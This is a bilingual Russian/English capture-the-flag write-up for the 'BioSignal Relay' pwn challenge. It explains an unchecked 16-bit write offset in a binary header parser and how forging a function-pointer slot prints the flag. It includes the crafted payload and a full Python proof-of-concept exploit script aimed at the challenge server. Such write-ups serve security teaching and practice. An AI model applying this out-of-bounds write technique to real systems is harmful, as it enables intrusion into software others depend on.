# CapLag-CTF-2 [RUS/ENG]

# BioSignal Relay — pwn writeup

**Категория/Category:** PWN

**Флаг/Flag:** `caplag{clp_header_extension_rewired_the_channel}`

---

## [RUS]

Функция `upload()` разбирает небольшой бинарный заголовок "CLP", в котором **байты 6–7 присланного пользователем payload используются напрямую как смещение записи** относительно единственной структуры программы в куче (`lab`), без какой-либо проверки границ. Это даёт примитив записи по произвольному смещению внутри бинарника. Функция `convert()` выбирает один из двух "слотов канала" в этой структуре и, если совпадает магическое значение, делает `jmp` на указатель функции, хранящийся сразу после него — ограниченный двумя разрешёнными адресами (`audit_channel` / `flag_channel`). Один из двух слотов (`lab+0x40`) никогда не затрагивается собственным "легитимным" кодом инициализации программы, поэтому OOB-запись позволяет подделать этот слот с нуля: записать корректную магию + адрес `flag_channel`, а затем вызвать `convert channel 0`, чтобы флаг был напечатан.

Никаких утечек, никакого ROP, никакого шеллкода — чистая логическая уязвимость типа "confused struct".

---

## 1. Разведка

```bash
file biosignal-relay
readelf -h biosignal-relay
readelf -l biosignal-relay | grep -A1 GNU_STACK
readelf -d biosignal-relay | grep BIND_NOW
```

| Свойство | Значение |
|---|---|
| Архитектура | x86-64 ELF, динамически слинкован |
| Тип | `EXEC` (**без PIE**) — фиксированные адреса, ASLR обходить не нужно |
| NX | включён |
| RELRO | Full (`BIND_NOW`) |
| Canary | не важен, переполнение стека здесь не используется |
| Символы | **не вырезаны (not stripped)** — имена функций присутствуют |

Отсутствие PIE и наличие символов говорят о том, что это не задача в первую очередь на ROP/утечки — она указывает на логическую уязвимость прямо в бинарнике, которую можно найти сразу через `objdump`.

```bash
nm biosignal-relay | grep ' [Tt] '
```

```
main
upload
convert
audit_channel
flag_channel
read_ulong
read_exact
read_line.constprop.0
print_flag.constprop.0
```

`flag_channel` и `print_flag` сразу бросаются в глаза как условие победы.

## 2. Структура состояния

```c
lab = calloc(1, 0xA0);   // 160 байт, выделяется один раз при старте
```

`lab` — это *единственный* изменяемый кусок состояния во всей программе. Практически любая интересная уязвимость в подобных CTF-задачах на pwn вращается ровно вокруг одного буфера/структуры — сначала нужно найти именно её.

## 3. `upload()` — реверс парсера

```
1) read_ulong()                  -> len, должно быть <= 0x200 (512)
2) read_exact(stack_buf, len)    -> читает `len` сырых байт в буфер на стеке
3) проверка заголовка:
     buf[0:4]  == "ICLP"
     buf[4]    == 'C'
     buf[5]    == 'L'
   (магия == "ICLPCL"), иначе -> "unknown signal file"
4) копирование #1:  lab[0 : min(len,64)) = buf[0 : min(len,64))
5. если len > 16:
     копирование #2:  lab[ r8w : r8w + (len-16) ) = buf[16 : len)
     // r8w == *(uint16_t*)(buf + 6)   <-- ПОЛНОСТЬЮ КОНТРОЛИРУЕТСЯ АТАКУЮЩИМ
6) безусловная инициализация "channel 1" (выполняется при КАЖДОМ вызове, независимо ни от чего):
     lab[0x70:0x74] = "1NHC"
     lab[0x78:0x80] = &audit_channel
     lab[0x80:0x89] = "reference\0"
```

Шаг 5 — это и есть уязвимость. Адрес назначения для *второго* копирования — это `lab_base + offset`, и `offset` считывается буквально из байтов 6–7 присланного пользователем payload. Никаких ограничений на `offset` нет — он может быть любым в диапазоне `[0, 0xFFFF]`. Длина ограничена (`len <= 0x200`, а длина записи `len - 16 <= 496`), но *место назначения* — нет.

Это **OOB-запись с контролируемым смещением**: мы выбираем и *куда* (16-битное смещение), и *что* (до ~496 байт) записывается относительно чанка `lab` в куче.

Шаг 6 не менее важен: он всегда сбрасывает `lab+0x70..0x8A` к фиксированной записи "audit channel" в *конце* каждого успешного `upload`. Так что всё, что мы запишем туда через OOB-примитив, будет снова затёрто ещё до того, как `upload()` вернёт управление. **`lab+0x70` и выше — тупиковый путь.**

## 4. `convert()` — проверка

```c
idx = read_ulong();          // должно быть 0 или 1
slot = lab + 48 * idx;

if (*(uint64_t*)(slot + 0x40) != 0x42494F2143484E31)
    -> "bad channel"

fn = *(uint64_t*)(slot + 0x48);
if (fn != &flag_channel && fn != &audit_channel)
    -> "channel not approved"

((void(*)(void*))fn)(slot + 0x40);   // jmp fn
```

Два индекса соответствуют двум "слотам":

| idx | slot | магия @ | указатель функции @ | затрагивается фиксированной инициализацией? |
|---|---|---|---|---|
| 1 | `lab+0x30` | `lab+0x70` | `lab+0x78` | **да, всегда сбрасывается на `audit_channel`** |
| 0 | `lab+0x00` | `lab+0x40` | `lab+0x48` | **никогда не затрагивается** |

Указатель функции ограничен списком из двух разрешённых значений (`audit_channel` / `flag_channel`) — здесь не нужно и невозможно произвольное выполнение кода, нужно лишь легитимно пройти проверку с адресом `flag_channel`.

Индекс 1 в итоге всегда указывает на `audit_channel`, независимо ни от чего, потому что фиксированная инициализация выполняется *после* нашей OOB-записи в том же самом вызове `upload()`. **Индекс 0 — единственная жизнеспособная цель** — и, кстати, `lab+0x40` расположен ровно на один байт дальше конца копирования №1 (`lab[0:64)` заканчивается на индексе 63), так что достичь его можно только через OOB-копирование, но не через "обычное".

## 5. Формирование payload

Цель: записать 16 байт начиная с `lab+0x40`:
- 8 байт: требуемая магия `0x42494F2143484E31`
- 8 байт: `&flag_channel` = `0x00000000004013C0`

```python
import struct

payload  = b"ICLP" + b"CL"                    # 6-байтный заголовок -> "ICLPCL"
payload += struct.pack("<H", 0x0040)          # bytes[6:8]  -> OOB-смещение = lab+0x40
payload += b"A" * 8                           # bytes[8:16] -> заполнитель, не используется OOB-копированием
payload += struct.pack("<Q", 0x42494F2143484E31)  # bytes[16:24] -> магия
payload += struct.pack("<Q", 0x4013C0)            # bytes[24:32] -> &flag_channel
# len(payload) == 32
```

Почему это работает:
- `len = 32 > 16` → OOB-копирование срабатывает.
- OOB-копирование записывает `len - 16 = 16` байт из `payload[16:32)` в `lab + 0x40`, то есть ровно магию, за которой следует указатель.
- Копирование №1 также записывает `payload[0:32)` в `lab[0:32)`, но это затрагивает только индексы 0–31, что далеко от `lab+0x40` — конфликта нет.

## 6. Ход эксплуатации

```
1) upload signal file
   file bytes: 32
   payload: <32 сырых байта выше>
   -> "clp header imported"

2) convert channel
   channel: 0
   -> convert() находит совпадение магии по адресу lab+0x40, fn == &flag_channel, переходит туда
   -> flag_channel -> print_flag(): getenv("CTF_FLAG"), проверяется на префикс
      "caplag{", печатается как "biosignal export: <flag>"
```

## 7. Скрипт PoC

```python
#!/usr/bin/env python3
import socket, struct, sys, time

MAGIC = 0x42494F2143484E31
FLAG_CHANNEL = 0x00000000004013C0

def build_payload():
    p  = b"ICLP" + b"CL"
    p += struct.pack("<H", 0x40)
    p += b"A" * 8
    p += struct.pack("<Q", MAGIC)
    p += struct.pack("<Q", FLAG_CHANNEL)
    assert len(p) == 32
    return p

def recvuntil(sock, marker, timeout=5):
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data

def run_remote(host, port):
    payload = build_payload()
    s = socket.create_connection((host, port), timeout=10)

    recvuntil(s, b">")
    s.sendall(b"1\n")
    recvuntil(s, b"bytes:")
    s.sendall(str(len(payload)).encode() + b"\n")
    recvuntil(s, b"payload:")
    s.sendall(payload)

    time.sleep(0.2)
    recvuntil(s, b">")
    s.sendall(b"2\n")
    recvuntil(s, b"channel:")
    s.sendall(b"0\n")

    time.sleep(0.2)
    print(s.recv(4096).decode(errors="replace"))
    s.close()

if __name__ == "__main__":
    run_remote(sys.argv[1], int(sys.argv[2]))
```

Запуск:

```bash
python3 exploit.py not-web.caplag-task.ru 31050
```

Вывод:

```
biosignal export: caplag{clp_header_extension_rewired_the_channel}
```

---

## [ENG]

`upload()` parses a small binary "CLP" header where **byte offsets 6–7 of
the user-supplied payload are used directly as a write offset** relative
to the program's single heap struct (`lab`), with no bounds check. This
gives an arbitrary-offset write primitive inside the binary. `convert()`
picks one of two "channel slots" in that struct and, if a magic value
matches, `jmp`s to a function pointer stored right after it — restricted
to two whitelisted addresses (`audit_channel` / `flag_channel`). One of
the two slots (`lab+0x40`) is never touched by the program's own
"legit" initialization code, so the OOB write can forge that slot from
scratch: write the correct magic + the address of `flag_channel`, then
call `convert channel 0` to get the flag printed.

No leaks, no ROP, no shellcode — a pure "confused struct" logic bug.

---

## 1. Recon

```bash
file biosignal-relay
readelf -h biosignal-relay
readelf -l biosignal-relay | grep -A1 GNU_STACK
readelf -d biosignal-relay | grep BIND_NOW
```

| Property | Value |
|---|---|
| Arch | x86-64 ELF, dynamically linked |
| Type | `EXEC` (**no PIE**) — fixed addresses, no ASLR to defeat |
| NX | enabled |
| RELRO | Full (`BIND_NOW`) |
| Canary | not relevant, no stack overflow used here |
| Symbols | **not stripped** — function names present |

No PIE + not stripped means this isn't primarily a ROP/leak challenge —
it points at a logic bug in the binary itself, reachable straight from
`objdump`.

```bash
nm biosignal-relay | grep ' [Tt] '
```

```
main
upload
convert
audit_channel
flag_channel
read_ulong
read_exact
read_line.constprop.0
print_flag.constprop.0
```

`flag_channel` and `print_flag` immediately stand out as the win
condition.

## 2. The state structure

```c
lab = calloc(1, 0xA0);   // 160 bytes, allocated once at startup
```

`lab` is the *only* piece of mutable state in the whole program. Every
interesting bug in a CTF pwn like this tends to revolve around exactly
one buffer/struct — find it first.

## 3. `upload()` — reversing the parser

```
1) read_ulong()                  -> len, must be <= 0x200 (512)
2) read_exact(stack_buf, len)    -> read `len` raw bytes into a stack buffer
3) header check:
     buf[0:4]  == "ICLP"
     buf[4]    == 'C'
     buf[5]    == 'L'
   (magic == "ICLPCL"), else -> "unknown signal file"
4) copy #1:  lab[0 : min(len,64)) = buf[0 : min(len,64))
5. if len > 16:
     copy #2:  lab[ r8w : r8w + (len-16) ) = buf[16 : len)
     // r8w == *(uint16_t*)(buf + 6)   <-- FULLY ATTACKER CONTROLLED
6) unconditional "channel 1" init (runs every single call, no matter what):
     lab[0x70:0x74] = "1NHC"
     lab[0x78:0x80] = &audit_channel
     lab[0x80:0x89] = "reference\0"
```

Step 5 is the bug. The destination address of the *second* copy is
`lab_base + offset`, and `offset` is read verbatim from bytes 6–7 of
the payload the user just sent. There is no bound on `offset` — it can
be anywhere in `[0, 0xFFFF]`. Length is bounded (`len <= 0x200`, and
the write length is `len - 16 <= 496`), but the *destination* is not.

This is a **controlled-offset out-of-bounds write**: we choose both
*where* (16-bit offset) and *what* (up to ~496 bytes) gets written
relative to the `lab` heap chunk.

Step 6 matters just as much: it always resets `lab+0x70..0x8A` to a
fixed "audit channel" record at the *end* of every successful upload.
So whatever we write there via the OOB primitive gets clobbered again
before `upload()` returns. **`lab+0x70` upward is a dead end.**

## 4. `convert()` — the gate

```c
idx = read_ulong();          // must be 0 or 1
slot = lab + 48 * idx;

if (*(uint64_t*)(slot + 0x40) != 0x42494F2143484E31)
    -> "bad channel"

fn = *(uint64_t*)(slot + 0x48);
if (fn != &flag_channel && fn != &audit_channel)
    -> "channel not approved"

((void(*)(void*))fn)(slot + 0x40);   // jmp fn
```

Two indices map to two "slots":

| idx | slot | magic @ | fn ptr @ | touched by fixed init? |
|---|---|---|---|---|
| 1 | `lab+0x30` | `lab+0x70` | `lab+0x78` | **yes, always reset to `audit_channel`** |
| 0 | `lab+0x00` | `lab+0x40` | `lab+0x48` | **never touched** |

The function pointer is restricted to a two-entry whitelist
(`audit_channel` / `flag_channel`) — no arbitrary code execution is
needed or possible here, we just need to legitimately satisfy the
check with `flag_channel`'s address.

Index 1 always ends up pointing at `audit_channel` no matter what,
because the fixed init runs *after* our OOB write in the very same
`upload()` call. **Index 0 is the only viable target** — and
conveniently, `lab+0x40` sits exactly one byte past the end of copy #1
(`lab[0:64)` stops at index 63), so it's reachable only via the OOB
copy, not the "normal" one.

## 5. Building the payload

Goal: write 16 bytes starting at `lab+0x40`:
- 8 bytes: the required magic `0x42494F2143484E31`
- 8 bytes: `&flag_channel` = `0x00000000004013C0`

```python
import struct

payload  = b"ICLP" + b"CL"                    # 6-byte header -> "ICLPCL"
payload += struct.pack("<H", 0x0040)          # bytes[6:8]  -> OOB offset = lab+0x40
payload += b"A" * 8                           # bytes[8:16] -> padding, unused by OOB copy
payload += struct.pack("<Q", 0x42494F2143484E31)  # bytes[16:24] -> magic
payload += struct.pack("<Q", 0x4013C0)            # bytes[24:32] -> &flag_channel
# len(payload) == 32
```

Why this works:
- `len = 32 > 16` → OOB copy fires.
- OOB copy writes `len - 16 = 16` bytes from `payload[16:32)` to
  `lab + 0x40`, i.e. exactly the magic followed by the pointer.
- Copy #1 also dumps `payload[0:32)` into `lab[0:32)`, but that only
  touches indices 0–31, well clear of `lab+0x40` — no interference.

## 6. Exploit flow

```
1) upload signal file
   file bytes: 32
   payload: <32 raw bytes above>
   -> "clp header imported"

2) convert channel
   channel: 0
   -> convert() matches magic at lab+0x40, fn == &flag_channel, jumps there
   -> flag_channel -> print_flag(): getenv("CTF_FLAG"), checked against
      "caplag{" prefix, printed as "biosignal export: <flag>"
```

## 7. PoC script

```python
#!/usr/bin/env python3
import socket, struct, sys, time

MAGIC = 0x42494F2143484E31
FLAG_CHANNEL = 0x00000000004013C0

def build_payload():
    p  = b"ICLP" + b"CL"
    p += struct.pack("<H", 0x40)
    p += b"A" * 8
    p += struct.pack("<Q", MAGIC)
    p += struct.pack("<Q", FLAG_CHANNEL)
    assert len(p) == 32
    return p

def recvuntil(sock, marker, timeout=5):
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data

def run_remote(host, port):
    payload = build_payload()
    s = socket.create_connection((host, port), timeout=10)

    recvuntil(s, b">")
    s.sendall(b"1\n")
    recvuntil(s, b"bytes:")
    s.sendall(str(len(payload)).encode() + b"\n")
    recvuntil(s, b"payload:")
    s.sendall(payload)

    time.sleep(0.2)
    recvuntil(s, b">")
    s.sendall(b"2\n")
    recvuntil(s, b"channel:")
    s.sendall(b"0\n")

    time.sleep(0.2)
    print(s.recv(4096).decode(errors="replace"))
    s.close()

if __name__ == "__main__":
    run_remote(sys.argv[1], int(sys.argv[2]))
```

Run:

```bash
python3 exploit.py not-web.caplag-task.ru 31050
```

Output:

```
biosignal export: caplag{clp_header_extension_rewired_the_channel}
```
